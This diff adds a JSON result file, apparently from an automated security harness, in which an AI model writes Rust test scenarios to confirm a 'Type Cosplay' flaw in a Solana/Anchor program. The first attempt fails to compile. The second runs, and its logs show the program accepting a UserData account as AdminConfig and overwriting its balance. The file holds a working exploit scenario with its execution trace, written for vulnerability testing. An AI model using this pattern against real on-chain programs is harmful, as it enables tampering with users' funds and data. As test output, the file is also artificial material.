@@ -1,0 +1,134 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: UserData foi aceita como AdminConfig e seu campo balance foi sobrescrito com o novo fee",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2245,
+        "completion_tokens": 650,
+        "latency_s": 3.95
+      },
+      "raw": "{\n  \"plan\": \"O programa usa UncheckedAccount para `config`, sem verificar o discriminador do tipo AdminConfig. Vou preparar uma conta AdminConfig legítima com admin = authority e fee = 100, e uma conta UserData com authority = authority (mesmo layout de 8+32+8 bytes). O baseline chama update_fee com a conta AdminConfig e deve ter sucesso. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig: como o discriminador é diferente, o harness aceita como COSPLAY; se o programa não validar o tipo, a instrução terá sucesso e sobrescreverá o campo `balance` da UserData (offset 40..48) com o novo fee, demonstrando o dano.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet admin_config = account(\\n    &env.program_id,\\n    &anchor_account_data(\\\"AdminConfig\\\", &(authority, 100u64)),\\n    None,\\n);\\nlet user_data = account(\\n    &env.program_id,\\n    &anchor_account_data(\\\"UserData\\\", &(authority, 777u64)),\\n    None,\\n);\\n\\nlet metas = vec![\\n    AccountMeta::new(admin_config_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n];\\n\\nlet baseline_ix = env.anchor_ix(\\\"update_fee\\\", &(200u64,), metas.clone());\\nlet baseline_accounts = vec![\\n    (admin_config_key, admin_config.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet baseline_result = env.baseline(\\\"update_fee legitimo com AdminConfig\\\", &baseline_ix, &baseline_accounts);\\n\\nlet attack_metas = vec![\\n    AccountMeta::new(user_data_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n];\\nlet attack_ix = env.anchor_ix(\\\"update_fee\\\", &(999u64,), attack_metas);\\nlet attack_accounts = vec![\\n    (user_data_key, user_data.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"update_fee com UserData no lugar de AdminConfig\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let after_user = after(&attack_result, &user_data_key);\\n    env.effect(\\n        \\\"UserData foi aceita como AdminConfig e seu campo balance foi sobrescrito com o novo fee\\\",\\n        read_u64(after_user.data(), 40) == 999u64,\\n    );\\n}\"\n}",
+      "plan": "O programa usa UncheckedAccount para `config`, sem verificar o discriminador do tipo AdminConfig. Vou preparar uma conta AdminConfig legítima com admin = authority e fee = 100, e uma conta UserData com authority = authority (mesmo layout de 8+32+8 bytes). O baseline chama update_fee com a conta AdminConfig e deve ter sucesso. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig: como o discriminador é diferente, o harness aceita como COSPLAY; se o programa não validar o tipo, a instrução terá sucesso e sobrescreverá o campo `balance` da UserData (offset 40..48) com o novo fee, demonstrando o dano.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet admin_config = account(\n    &env.program_id,\n    &anchor_account_data(\"AdminConfig\", &(authority, 100u64)),\n    None,\n);\nlet user_data = account(\n    &env.program_id,\n    &anchor_account_data(\"UserData\", &(authority, 777u64)),\n    None,\n);\n\nlet metas = vec![\n    AccountMeta::new(admin_config_key, false),\n    AccountMeta::new_readonly(authority, true),\n];\n\nlet baseline_ix = env.anchor_ix(\"update_fee\", &(200u64,), metas.clone());\nlet baseline_accounts = vec![\n    (admin_config_key, admin_config.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet baseline_result = env.baseline(\"update_fee legitimo com AdminConfig\", &baseline_ix, &baseline_accounts);\n\nlet attack_metas = vec![\n    AccountMeta::new(user_data_key, false),\n    AccountMeta::new_readonly(authority, true),\n];\nlet attack_ix = env.anchor_ix(\"update_fee\", &(999u64,), attack_metas);\nlet attack_accounts = vec![\n    (user_data_key, user_data.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"update_fee com UserData no lugar de AdminConfig\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let after_user = after(&attack_result, &user_data_key);\n    env.effect(\n        \"UserData foi aceita como AdminConfig e seu campo balance foi sobrescrito com o novo fee\",\n        read_u64(after_user.data(), 40) == 999u64,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `admin_config_key` in this scope\n  --> tests/attempt.rs:22:26\n   |\n22 |         AccountMeta::new(admin_config_key, false),\n   |                          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n22 -         AccountMeta::new(admin_config_key, false),\n22 +         AccountMeta::new(admin_config, false),\n   |\n\nerror[E0425]: cannot find value `admin_config_key` in this scope\n  --> tests/attempt.rs:28:10\n   |\n28 |         (admin_config_key, admin_config.clone()),\n   |          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n28 -         (admin_config_key, admin_config.clone()),\n28 +         (admin_config, admin_config.clone()),\n   |\n\nerror[E0425]: cannot find value `user_data_key` in this scope\n  --> tests/attempt.rs:34:26\n   |\n34 |         AccountMeta::new(user_data_key, false),\n   |                          ^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n34 -         AccountMeta::new(user_data_key, false),\n34 +         AccountMeta::new(user_data, false),\n   |\n\nerror[E0425]: cannot find value `user_data_key` in this scope\n  --> tests/attempt.rs:39:10\n   |\n39 |         (user_data_key, user_data.clone()),",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `admin_config_key` in this scope\n  --> tests/attempt.rs:22:26\n   |\n22 |         AccountMeta::new(admin_config_key, false),\n   |                          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n22 -         AccountMeta::new(admin_config_key, false),\n22 +         AccountMeta::new(admin_config, false),\n   |\n\nerror[E0425]: cannot find value `admin_config_key` in this scope\n  --> tests/attempt.rs:28:10\n   |\n28 |         (admin_config_key, admin_config.clone()),\n   |          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n28 -         (admin_config_key, admin_config.clone()),\n28 +         (admin_config, admin_config.clone()),\n   |\n\nerror[E0425]: cannot find value `user_data_key` in this scope\n  --> tests/attempt.rs:34:26\n   |\n34 |         AccountMeta::new(user_data_key, false),\n   |                          ^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n34 -         AccountMeta::new(user_data_key, false),\n34 +         AccountMeta::new(user_data, false),\n   |\n\nerror[E0425]: cannot find value `user_data_key` in this scope\n  --> tests/attempt.rs:39:10\n   |\n39 |         (user_data_key, user_data.clone()),"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3034,
+        "completion_tokens": 695,
+        "latency_s": 3.23
+      },
+      "raw": "{\"plan\": \"Preparo uma conta AdminConfig legitima (admin = authority) e uma conta UserData do mesmo dono, ambas com o mesmo layout de 8 bytes de discriminador + 32 bytes de pubkey + 8 bytes de u64. O baseline chama update_fee com AdminConfig e deve ter sucesso, provando que o cenario esta correto. O ataque chama update_fee passando UserData no lugar de AdminConfig: como a instrucao usa UncheckedAccount e le o admin diretamente dos bytes 8..40, o discriminador nao e validado. O efeito mede que o campo balance (offset 40) da UserData foi sobrescrito com o novo fee, algo que o uso legitimo nunca faria.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet admin_config_key = Pubkey::new_unique();\\nlet user_data_key = Pubkey::new_unique();\\n\\nlet admin_config = account(\\n    &env.program_id,\\n    &anchor_account_data(\\\"AdminConfig\\\", &(authority, 100u64)),\\n    None,\\n);\\nlet user_data = account(\\n    &env.program_id,\\n    &anchor_account_data(\\\"UserData\\\", &(authority, 777u64)),\\n    None,\\n);\\n\\nlet baseline_metas = vec![\\n    AccountMeta::new(admin_config_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n];\\nlet baseline_ix = env.anchor_ix(\\\"update_fee\\\", &(200u64,), baseline_metas);\\nlet baseline_accounts = vec![\\n    (admin_config_key, admin_config.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet _baseline_result = env.baseline(\\n    \\\"update_fee legitimo com AdminConfig\\\",\\n    &baseline_ix,\\n    &baseline_accounts,\\n);\\n\\nlet attack_metas = vec![\\n    AccountMeta::new(user_data_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n];\\nlet attack_ix = env.anchor_ix(\\\"update_fee\\\", &(999u64,), attack_metas);\\nlet attack_accounts = vec![\\n    (user_data_key, user_data.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\n    \\\"update_fee com UserData no lugar de AdminConfig\\\",\\n    &attack_ix,\\n    &attack_accounts,\\n);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let after_user = after(&attack_result, &user_data_key);\\n    env.effect(\\n        \\\"UserData foi aceita como AdminConfig e seu campo balance foi sobrescrito com o novo fee\\\",\\n        read_u64(after_user.data(), 40) == 999u64,\\n    );\\n}\"}",
+      "plan": "Preparo uma conta AdminConfig legitima (admin = authority) e uma conta UserData do mesmo dono, ambas com o mesmo layout de 8 bytes de discriminador + 32 bytes de pubkey + 8 bytes de u64. O baseline chama update_fee com AdminConfig e deve ter sucesso, provando que o cenario esta correto. O ataque chama update_fee passando UserData no lugar de AdminConfig: como a instrucao usa UncheckedAccount e le o admin diretamente dos bytes 8..40, o discriminador nao e validado. O efeito mede que o campo balance (offset 40) da UserData foi sobrescrito com o novo fee, algo que o uso legitimo nunca faria.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet admin_config_key = Pubkey::new_unique();\nlet user_data_key = Pubkey::new_unique();\n\nlet admin_config = account(\n    &env.program_id,\n    &anchor_account_data(\"AdminConfig\", &(authority, 100u64)),\n    None,\n);\nlet user_data = account(\n    &env.program_id,\n    &anchor_account_data(\"UserData\", &(authority, 777u64)),\n    None,\n);\n\nlet baseline_metas = vec![\n    AccountMeta::new(admin_config_key, false),\n    AccountMeta::new_readonly(authority, true),\n];\nlet baseline_ix = env.anchor_ix(\"update_fee\", &(200u64,), baseline_metas);\nlet baseline_accounts = vec![\n    (admin_config_key, admin_config.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet _baseline_result = env.baseline(\n    \"update_fee legitimo com AdminConfig\",\n    &baseline_ix,\n    &baseline_accounts,\n);\n\nlet attack_metas = vec![\n    AccountMeta::new(user_data_key, false),\n    AccountMeta::new_readonly(authority, true),\n];\nlet attack_ix = env.anchor_ix(\"update_fee\", &(999u64,), attack_metas);\nlet attack_accounts = vec![\n    (user_data_key, user_data.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\n    \"update_fee com UserData no lugar de AdminConfig\",\n    &attack_ix,\n    &attack_accounts,\n);\n\nif attack_result.program_result == ProgramResult::Success {\n    let after_user = after(&attack_result, &user_data_key);\n    env.effect(\n        \"UserData foi aceita como AdminConfig e seu campo balance foi sobrescrito com o novo fee\",\n        read_u64(after_user.data(), 40) == 999u64,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "update_fee legitimo com AdminConfig",
+            "result": "Success",
+            "compute_units": 1493,
+            "account_flags": "-w,sr",
+            "ix_head": "bc5e51de3e8f7fa8",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP",
+                "data_len": 48,
+                "head": "9c0a4fa147093e4d",
+                "digest": "bb2574fd7d2eefb2",
+                "post": "9c0a4fa147093e4d0000000000000001000000000000000000000000000000000000000000000000c800000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "update_fee com UserData no lugar de AdminConfig",
+            "result": "Success",
+            "compute_units": 1493,
+            "account_flags": "-w,sr",
+            "ix_head": "bc5e51de3e8f7fa8",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP",
+                "data_len": 48,
+                "head": "8bf8a7cbfddcd2dd",
+                "digest": "2e754874bc22e54d",
+                "post": "8bf8a7cbfddcd2dd0000000000000001000000000000000000000000000000000000000000000000e703000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "UserData foi aceita como AdminConfig e seu campo balance foi sobrescrito com o novo fee",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP invoke [1]",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP consumed 1493 of 1400000 compute units",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP success",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP invoke [1]",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP consumed 1493 of 1400000 compute units",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: UserData foi aceita como AdminConfig e seu campo balance foi sobrescrito com o novo fee"
+    }
+  ],
+  "case_id": "SSP-06-A-V",
+  "static_finding": {
+    "category": "COSPLAY",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Type Cosplay."
+  }
+}
